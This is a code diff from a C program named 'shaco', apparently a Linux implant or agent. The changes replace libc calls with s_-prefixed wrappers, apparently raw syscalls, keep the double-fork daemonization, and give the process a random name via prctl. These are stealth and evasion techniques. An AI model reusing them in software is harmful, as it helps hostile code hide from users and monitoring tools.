@@ -5,37 +5,19 @@
 #include "../Helpers/Protect.h"
 
 #include <sys/prctl.h>
-#include <sys/stat.h>
-#include <signal.h>
-#include <unistd.h>
-#include <time.h>
 
-
-/*clock_t s_clock(void) {
-    static clock_t start_time = 0;
-    struct timespec current_time;
-
-    if (clock_gettime(CLOCK_MONOTONIC, &current_time) == -1) 
-        return (clock_t)-1;
-    
-    if (start_time == 0) {
-        start_time = current_time.tv_sec * CLOCKS_PER_SEC + current_time.tv_nsec / (1000000000 / CLOCKS_PER_SEC);
-        return 0;
-    }
-    return (current_time.tv_sec * CLOCKS_PER_SEC + current_time.tv_nsec / (1000000000 / CLOCKS_PER_SEC)) - start_time;
-}*/
 
 void daemonize(){
 #ifdef DAEMONIZE
-    pid_t _t = fork();
+    pid_t _t = s_fork();
     if(_t < 0 || _t > 0) shaco_exit();
-    setsid();
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGHUP, SIG_IGN);
-    _t = fork();
+    s_setsid();
+    s_signal(SIGCHLD, SIG_IGN);
+    s_signal(SIGHUP, SIG_IGN);
+    _t = s_fork();
     if (_t < 0 || _t > 0) shaco_exit();
-    umask(0);
-    chdir("/");
+    s_umask(0);
+    s_chdir("/");
 #endif
 }
 
@@ -47,7 +29,7 @@ bool shaco_init(char **argv){
     daemonize();
 
     char *procname = generate_random_str(generate_random_int(3,7));
-    prctl(PR_SET_NAME, procname,0,0,0);
+    s_prctl(15, procname);
 
     PSETTINGS ps = get_settings();
 #ifndef DEBUG
@@ -59,11 +41,14 @@ bool shaco_init(char **argv){
     return true;
 }
 
-void shaco_exit(){ _exit(1); }
+void shaco_exit(){ s__exit(1); }
 
 void shaco_sleep(int value){
     if(value <= 0) return;
-    sleep(value);
-//    clock_t init = s_clock();
-//    while(s_clock() - init < (value * 1000) * CLOCKS_PER_SEC / 1000);
+    struct timespec req, rem;
+    req.tv_sec = value;
+    req.tv_nsec = 0;
+    while(s_nanosleep(&req, &rem))
+        req = rem;
+    return;
 }
